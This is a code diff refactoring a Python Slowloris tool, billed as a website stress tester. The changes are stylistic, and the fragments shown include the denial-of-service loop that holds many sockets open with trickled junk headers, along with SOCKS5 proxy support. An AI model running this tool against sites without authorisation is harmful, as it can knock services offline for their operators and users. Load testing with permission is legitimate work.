@@ -10,9 +10,7 @@ parser = argparse.ArgumentParser(
     description="Slowloris, low bandwidth stress test tool for websites"
 )
 parser.add_argument("host", nargs="?", help="Host to perform stress test on")
-parser.add_argument(
-    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
-)
+parser.add_argument("-p", "--port", default=80, help="Port of webserver, usually 80", type=int)
 parser.add_argument(
     "-s",
     "--sockets",
@@ -41,12 +39,8 @@ parser.add_argument(
     action="store_true",
     help="Use a SOCKS5 proxy for connecting",
 )
-parser.add_argument(
-    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
-)
-parser.add_argument(
-    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
-)
+parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
+parser.add_argument("--proxy-port", default="8080", help="SOCKS5 proxy port", type=int)
 parser.add_argument(
     "--https",
     dest="https",
@@ -82,9 +76,7 @@ if args.useproxy:
     try:
         import socks
 
-        socks.setdefaultproxy(
-            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
-        )
+        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
         socket.socket = socks.socksocket
         logging.info("Using SOCKS5 proxy for connecting...")
     except ImportError:
@@ -117,8 +109,8 @@ if args.https:
     logging.info("Importing ssl module")
     import ssl
 
-    setattr(ssl.SSLSocket, "send_line", send_line)
-    setattr(ssl.SSLSocket, "send_header", send_header)
+    ssl.SSLSocket.send_line = send_line
+    ssl.SSLSocket.send_header = send_header
 
 list_of_sockets = []
 user_agents = [
@@ -149,8 +141,8 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
-setattr(socket.socket, "send_line", send_line)
-setattr(socket.socket, "send_header", send_header)
+socket.socket.send_line = send_line
+socket.socket.send_header = send_header
 
 
 def init_socket(ip: str):
@@ -184,7 +176,7 @@ def slowloris_iteration():
     for s in list(list_of_sockets):
         try:
             s.send_header("X-a", random.randint(1, 5000))
-        except socket.error:
+        except OSError:
             list_of_sockets.remove(s)
 
     # Some of the sockets may have been closed due to errors or timeouts.
@@ -201,7 +193,7 @@ def slowloris_iteration():
             if not s:
                 continue
             list_of_sockets.append(s)
-        except socket.error as e:
+        except OSError as e:
             logging.debug("Failed to create new socket: %s", e)
             break
 
@@ -216,7 +208,7 @@ def main():
         try:
             logging.debug("Creating socket nr %s", _)
             s = init_socket(ip)
-        except socket.error as e:
+        except OSError as e:
             logging.debug(e)
             break
         list_of_sockets.append(s)
